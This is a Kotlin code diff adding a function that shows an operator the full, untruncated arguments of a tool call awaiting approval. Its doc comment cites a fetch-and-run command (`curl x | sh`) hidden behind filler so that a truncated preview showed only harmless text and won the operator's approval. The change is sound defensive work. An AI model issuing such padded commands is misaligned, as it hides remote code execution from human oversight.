@@ -114,6 +114,37 @@ object Redactor {
         }
     }
 
+    /**
+     * What the operator is shown when asked to approve a call.
+     *
+     * Not [preview], and the difference is the point. The preview truncates each value
+     * at [VALUE_LIMIT] and masks long runs, which is right for a record that gets
+     * screenshotted and wrong for a decision: `git status && echo <filler> && curl
+     * x | sh` previewed as its harmless first eighty characters, and the operator
+     * approved a command they never saw. Here nothing is truncated or masked except
+     * values under a sensitive key, whose content rarely decides anything. Past
+     * [OPERATOR_LIMIT] the text says so in words, first, rather than trailing off.
+     */
+    fun forOperator(arguments: JsonElement?): String {
+        if (arguments !is JsonObject || arguments.isEmpty()) return "{}"
+        val full =
+            arguments.entries.joinToString("\n") { (key, value) ->
+                val shown =
+                    when {
+                        sensitiveKey.containsMatchIn(key) -> "<redacted>"
+                        value is JsonPrimitive -> value.content
+                        else -> value.toString()
+                    }
+                "$key=$shown"
+            }
+        if (full.length <= OPERATOR_LIMIT) return full
+        return "WARNING: these arguments are ${full.length} characters long and only the first " +
+            "$OPERATOR_LIMIT are shown. Refuse unless you know what the rest says.\n\n" +
+            full.take(OPERATOR_LIMIT)
+    }
+
+    private const val OPERATOR_LIMIT = 4000
+
     private fun scrub(value: JsonElement): String {
         val raw =
             when (value) {
